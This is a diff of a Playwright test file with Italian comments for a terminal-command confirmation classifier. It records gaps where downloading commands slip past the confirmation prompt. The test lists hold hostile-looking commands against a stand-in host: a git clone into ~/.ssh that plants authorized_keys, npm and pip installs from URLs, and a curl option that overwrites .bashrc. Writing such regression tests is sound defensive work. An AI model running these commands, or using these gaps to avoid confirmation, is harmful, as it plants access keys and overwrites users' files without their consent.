@@ -133,18 +133,48 @@ test('#479: traccia visiva del box di conferma (chiaro e scuro)', async ({ app, 
   }
 });
 
-// Caccia alle porte nuove: la causa del #479 era leggere il TESTO del comando
-// invece dell'effetto. Queste forme scaricano DAVVERO (verificato con wget vero
-// contro un server locale: `wget help` salva index.html nella cartella corrente)
-// ma il classificatore le legge come una semplice richiesta di aiuto/versione.
-test('#479 — porta residua: wget con un operando che sembra «help»/«version» scarica senza chiedere niente', async ({ app, openTab }) => {
+// ── rilievi residui (verifica 2026-09-03) ───────────────────────────────────
+// test.fixme: repro VERIFICATE ROSSE oggi (senza `.fixme`). Sono la stessa
+// causa del #479 — un'esenzione decisa leggendo il TESTO del comando, e
+// l'invariante dichiarata («scaricare dalla rete facendo atterrare un file su
+// disco è sempre livello 3») applicata al solo wget/curl. Chi lavora il fix
+// toglie `.fixme`.
+
+// `wget help` e `wget version`: wget legge quella parola come INDIRIZZO e
+// scarica davvero (provato con wget vero contro un server locale: salva
+// index.html nella cartella corrente, scelta prima con un `cd` che non chiede
+// niente). Il classificatore le legge invece come una richiesta di aiuto/
+// versione e le fa passare DIRETTE, senza nemmeno l'OK.
+test.fixme('#479 — porta residua: wget con un operando che sembra «help»/«version» scarica senza chiedere niente', async ({ app, openTab }) => {
   const page = await openTab(NEWTAB);
   await enableTerminal(page);
 
   for (const c of ['wget help', 'wget version', 'wget -v version', 'wget -h help']) {
     const r = await execAction(app, cmd(c));
-    // Oggi passa DIRETTO (nessun popup): wget legge quella parola come indirizzo
-    // e fa atterrare index.html nella cartella corrente, scelta con un `cd`.
     expect(r.needsConfirm, `${c} dovrebbe chiedere conferma come ogni altro wget`).toBe(3);
+  }
+});
+
+// Gli ALTRI programmi che scaricano dalla rete e fanno atterrare file restano
+// al semplice OK. Provato davvero: un `git clone` da un server locale dentro
+// una `~/.ssh` non ancora esistente fa atterrare l'authorized_keys scelto dal
+// server. Alzarli ha però un costo d'attrito vero su comandi di tutti i giorni
+// (`git clone`, `npm install`): è una scelta da owner, non un'ovvietà.
+test.fixme('#479 — l\'invariante vale solo per wget/curl: gli altri scaricatori restano all\'OK', async ({ app, openTab }) => {
+  const page = await openTab(NEWTAB);
+  await enableTerminal(page);
+
+  for (const c of [
+    'git clone http://esempio.test/repo.git /home/u/.ssh',
+    'git pull http://esempio.test/repo',
+    'git fetch http://esempio.test/repo',
+    'npm install http://esempio.test/pacchetto.tgz',
+    'pip install http://esempio.test/pacchetto.tar.gz',
+    // stessa classe dei --hsts/--alt-svc già alzati, ma non coperta
+    // (curl ≥ 8.12): scrive il file indicato, troncando quello che c'era.
+    'curl --ssl-sessions /home/u/.bashrc https://esempio.test/x',
+  ]) {
+    const r = await execAction(app, cmd(c));
+    expect(r.needsConfirm, c).toBe(3);
   }
 });
